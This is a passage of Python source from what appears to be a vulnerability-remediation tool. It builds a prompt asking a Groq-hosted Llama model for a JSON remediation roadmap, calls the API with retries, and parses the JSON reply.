{json.dumps(roadmap_summary, indent=2)}

Attack chains requiring multi-step remediation:
{json.dumps([c.get('chain_name','') for c in chains[:5]], indent=2)}

Return a JSON object with EXACTLY these keys:
- "executive_briefing": string — 4-5 sentences suitable for a CISO or board. Explain current risk, what the roadmap achieves, and expected security posture after implementation.
- "top5_critical_actions": array of objects, each with "rank" (int 1-5), "action" (string — specific), "why_first" (string — business justification), "owner" (string — who should own this: Security Team / DevOps / DevSecOps / Network Team).
- "implementation_tips": array of strings — 3-5 practical notes for the team implementing the fixes (testing approach, rollback plan, change management).
- "risk_acceptance_note": string — which remaining risks after the roadmap may need to be formally risk-accepted by management, and why.
- "estimated_effort_days": object with "immediate" (int), "short_term" (int), "long_term" (int) — realistic person-day estimates per phase.
- "post_remediation_scan_checklist": array of strings — specific ARTEX scan modules and external tools to re-run after each phase to verify fixes.

Return ONLY valid JSON. No markdown fences, no preamble."""

    def _call_groq(self, prompt: str) -> Optional[str]:
        headers = {
            "Authorization": f"Bearer {self.groq_api_key}",
            "Content-Type":  "application/json",
        }
        payload = {
            "model":       "llama3-70b-8192",
            "messages":    [{"role": "user", "content": prompt}],
            "temperature": 0.2,
            "max_tokens":  1800,
        }
        for attempt in range(3):
            try:
                self.logger.info(f"Groq API call attempt {attempt + 1}")
                resp = requests.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers = headers,
                    json    = payload,
                    timeout = self.timeout,
                )
                if resp.status_code == 200:
                    return resp.json()["choices"][0]["message"]["content"]
                if resp.status_code == 429:
                    time.sleep(12 * (attempt + 1))
                    continue
                break
            except requests.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(2 ** attempt)
            except Exception as e:
                self.logger.error(f"Groq error: {e}")
                break
        return None

    def _parse_ai_response(self, text: str) -> Optional[Dict]:
        cleaned = text.strip()
        if cleaned.startswith("```"):
            cleaned = cleaned.split("```")[1]
            if cleaned.startswith("json"):
                cleaned = cleaned[4:]
        cleaned = cleaned.strip()
        try:
            parsed = json.loads(cleaned)
            parsed["ai_model"]     = "Groq Llama3-70B"
            parsed["generated_at"] = datetime.now().isoformat()
            return parsed
        except json.JSONDecodeError:
            start = cleaned.find("{")
            end   = cleaned.rfind("}") + 1
            if start != -1 and end > start:
                try:
                    parsed = json.loads(cleaned[start:end])
                    parsed["ai_model"]     = "Groq Llama3-70B"
                    parsed["generated_at"] = datetime.now().isoformat()
                    return parsed
                except json.JSONDecodeError:
                    pass
            self.logger.error("Could not parse AI JSON response")
            return None


# ---------------------------------------------------------------------------
# Severity order helper
# ---------------------------------------------------------------------------
SEV_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}